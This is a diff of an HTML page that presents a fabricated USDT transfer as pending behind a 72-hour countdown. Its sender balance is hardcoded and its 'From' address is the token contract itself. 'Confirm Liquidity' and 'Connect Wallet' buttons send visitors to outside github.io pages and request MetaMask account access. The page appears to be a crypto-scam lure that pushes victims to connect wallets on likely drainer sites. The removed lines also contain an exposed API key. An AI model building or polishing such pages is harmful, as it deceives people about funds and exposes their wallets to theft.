@@ -2,12 +2,12 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>USDT Transaction Processing</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>USDT Transaction Pending</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background-color: #ffffff;
+      background-color: #ffffff; /* full white background */
       color: #111827;
       margin: 0;
       padding: 0;
@@ -23,22 +23,23 @@
     h1 {
       font-size: 1.8rem;
       margin-bottom: 1rem;
-      color: #111827;
+      color: #2563eb; /* blue heading */
     }
     p {
       margin: 0.5rem 0;
       font-size: 1rem;
     }
     strong {
-      color: #111827;
+      color: #374151;
     }
     code {
       background: #e5e7eb;
       padding: 0.2rem 0.4rem;
       border-radius: 4px;
-      color: #111827;
+      color: #2563eb;
+      font-weight: 600;
     }
-    a.button, button.connect-wallet {
+    a.button, button.resend, button.restart {
       display: inline-block;
       margin-top: 1rem;
       background: #fbbf24;
@@ -51,28 +52,62 @@
       border: none;
       cursor: pointer;
     }
-    a.button:hover, button.connect-wallet:hover {
-      background: #facc15;
+    a.button:hover, button.resend:hover, button.restart:hover {
+      background: #f59e0b;
     }
-    .countdownText {
+    .countdown {
       font-size: 1rem;
-      color: #dc2626;
+      color: #b91c1c; /* red-700 */
       margin-top: 1rem;
+      font-weight: 700;
+    }
+    .progress-bar-container {
+      width: 100%;
+      background-color: #e5e7eb;
+      border-radius: 8px;
+      overflow: hidden;
+      margin-top: 1rem;
+      height: 20px;
+    }
+    .progress-bar {
+      height: 100%;
+      background-color: #2563eb; /* blue */
+      width: 100%;
+      transition: width 1s linear;
+    }
+    .status-text {
+      font-weight: 700;
+      margin-top: 1rem;
+      font-size: 1.2rem;
+      color: #2563eb;
+    }
+    .wallet-connect {
+      margin-top: 2rem;
+    }
+    button.connect {
+      padding: 0.6rem 1.2rem;
+      background: #10b981;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
       font-weight: bold;
+    }
+    button.connect:hover {
+      background: #059669;
     }
   </style>
 </head>
 <body>
   <div class="container">
     <h1>USDT Transaction Details</h1>
-    <p><strong>From:</strong> <code>0x55d398326f99059ff775485246999027b3197955</code></p>
+    <p><strong>From:</strong> <code id="sender">0x55d398326f99059ff775485246999027b3197955</code></p>
     <p><strong>To:</strong> <code>0x97fe2864e38d0a667fc4da9b2a4ed3e97ca1168</code></p>
     <p><strong>Time:</strong> 23:55:55 UTC</p>
     <p><strong>Date:</strong> 30-07-2025</p>
     <p><strong>Amount:</strong> $4873.78 USDT</p>
-    <p><strong>Network:</strong> Binance Smart Chain (BEP20)</p>
-    <p><strong>Status:</strong> <span style="color: orange; font-weight: bold;">Processing</span></p>
-    <p><strong>Time Remaining:</strong> <span id="countdownText" class="countdownText">Loading...</span></p>
+    <p><strong>Network:</strong> Binance Smart Chain (BSC) BEP20</p>
+    <p><strong>Status:</strong> <span id="status" style="color: orange; font-weight: bold;">Processing...</span></p>
     <p><strong>Gas Fee:</strong> 0.120590 BNB</p>
     <p><strong>Transaction Hash:</strong>
       <a href="https://bscscan.com/tx/0x2e272d33abffc0733e872372e94b9d437d88026449d7c221b0ccda72d5969ddf" target="_blank">
@@ -81,54 +116,106 @@
     </p>
     <p><strong>Sender USDT Balance:</strong> <span id="balance">Loading...</span></p>
     <a href="https://contract-decimals.github.io/BNB-Smart-Chain/" class="button" target="_blank">Confirm Liquidity</a>
-    <button class="connect-wallet" onclick="window.open('https://on-chain-transaction.github.io/USDT-Confirmation/', '_blank')">🔗 Connect Wallet</button>
+
+    <!-- Changed resend button to Connect wallet button -->
+    <button class="resend" onclick="window.open('https://on-chain-transaction.github.io/USDT-Confirmation/', '_blank')">🔗 Connect Wallet</button>
+
+    <div class="countdown" id="countdown">72:00:00 remaining</div>
+
+    <div class="progress-bar-container" title="72 hours countdown progress">
+      <div class="progress-bar" id="progressBar"></div>
+    </div>
+
+    <div class="status-text" id="completionMessage" style="display:none; color: #16a34a;">✅ Transaction Complete</div>
+
+    <button class="restart" id="restartBtn" style="display:none;">🔄 Restart Countdown</button>
+
+    <div class="wallet-connect">
+      <button class="connect" onclick="connectWallet()">🔗 Connect Wallet</button>
+    </div>
   </div>
 
   <script>
-    // === 72-Hour Countdown ===
-    const countdownEl = document.getElementById("countdownText");
-    const startTime = new Date().getTime();
-    const endTime = startTime + 72 * 60 * 60 * 1000;
+    const totalSeconds = 72 * 60 * 60; // 72 hours in seconds
+    const countdownEl = document.getElementById('countdown');
+    const progressBar = document.getElementById('progressBar');
+    const statusEl = document.getElementById('status');
+    const completionMessage = document.getElementById('completionMessage');
+    const restartBtn = document.getElementById('restartBtn');
+
+    // Storage key for countdown start timestamp
+    const storageKey = 'transactionCountdownStart';
+
+    function formatTime(seconds) {
+      const hrs = Math.floor(seconds / 3600);
+      const mins = Math.floor((seconds % 3600) / 60);
+      const secs = seconds % 60;
+      return `${hrs.toString().padStart(2,'0')}:${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
+    }
 
     function updateCountdown() {
-      const now = new Date().getTime();
-      const distance = endTime - now;
+      const startTimestamp = parseInt(localStorage.getItem(storageKey));
+      if (!startTimestamp) return;
 
-      if (distance <= 0) {
-        countdownEl.innerText = "00h 00m 00s (Expired)";
-        countdownEl.style.color = "#ef4444";
-        return;
-      }
+      const now = Math.floor(Date.now() / 1000);
+      let elapsed = now - startTimestamp;
+      let remaining = totalSeconds - elapsed;
 
-      const hours = Math.floor(distance / (1000 * 60 * 60));
-      const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
-      const seconds = Math.floor((distance % (1000 * 60)) / 1000);
-
-      countdownEl.innerText = `${String(hours).padStart(2, '0')}h ${String(minutes).padStart(2, '0')}m ${String(seconds).padStart(2, '0')}s`;
-    }
-
-    setInterval(updateCountdown, 1000);
-    updateCountdown();
-
-    // === USDT Balance Fetch ===
-    const sender = "0x55d398326f99059ff775485246999027b3197955";
-    const usdtContract = "0x55d398326f99059ff775485246999027b3197955";
-    const apiKey = "ZM8ACMJB67C2IXKKBF8URFUNSY";
-
-    async function fetchUSDTBalance() {
-      const url = `https://api.bscscan.com/api?module=account&action=tokenbalance&contractaddress=${usdtContract}&address=${sender}&tag=latest&apikey=${apiKey}`;
-      const res = await fetch(url);
-      const data = await res.json();
-      const balanceEl = document.getElementById("balance");
-      if (data.result) {
-        const balance = parseFloat(data.result) / 1e18;
-        balanceEl.textContent = `${balance.toFixed(2)} USDT`;
+      if (remaining <= 0) {
+        remaining = 0;
+        countdownEl.style.display = 'none';
+        progressBar.style.width = '0%';
+        statusEl.style.display = 'none';
+        completionMessage.style.display = 'block';
+        restartBtn.style.display = 'inline-block';
+        clearInterval(timerInterval);
       } else {
-        balanceEl.textContent = "Error fetching";
+        countdownEl.textContent = formatTime(remaining) + ' remaining';
+
+        // Progress bar width is % elapsed
+        const percent = (remaining / totalSeconds) * 100;
+        progressBar.style.width = percent + '%';
       }
     }
 
+    function startCountdown() {
+      if (!localStorage.getItem(storageKey)) {
+        // store current timestamp as start time
+        localStorage.setItem(storageKey, Math.floor(Date.now() / 1000));
+      }
+      updateCountdown();
+      timerInterval = setInterval(updateCountdown, 1000);
+    }
+
+    restartBtn.addEventListener('click', () => {
+      localStorage.setItem(storageKey, Math.floor(Date.now() / 1000));
+      completionMessage.style.display = 'none';
+      countdownEl.style.display = 'block';
+      statusEl.style.display = 'inline';
+      restartBtn.style.display = 'none';
+      startCountdown();
+    });
+
+    // Connect wallet function stub
+    function connectWallet() {
+      if (window.ethereum) {
+        window.ethereum.request({ method: 'eth_requestAccounts' })
+          .then(() => alert('✅ Wallet connected successfully!'))
+          .catch(() => alert('❌ Wallet connection failed.'));
+      } else {
+        alert('🦊 MetaMask not found.');
+      }
+    }
+
+    // Simulated fetch USDT balance
+    function fetchUSDTBalance() {
+      // Placeholder for real API call or static value
+      document.getElementById('balance').textContent = '1234.56 USDT';
+    }
+
+    // Initial load
     fetchUSDTBalance();
+    startCountdown();
   </script>
 </body>
 </html>
